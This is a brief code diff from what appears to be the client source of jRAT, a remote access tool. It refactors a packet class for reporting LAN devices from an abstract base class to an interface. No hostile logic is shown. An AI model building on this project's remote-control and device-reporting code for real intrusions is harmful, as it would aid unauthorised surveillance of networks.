@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet49LanDevices extends AbstractOutgoingPacket {
+public class Packet49LanDevices implements OutgoingPacket {
 
 	private String device;
 	private String address;
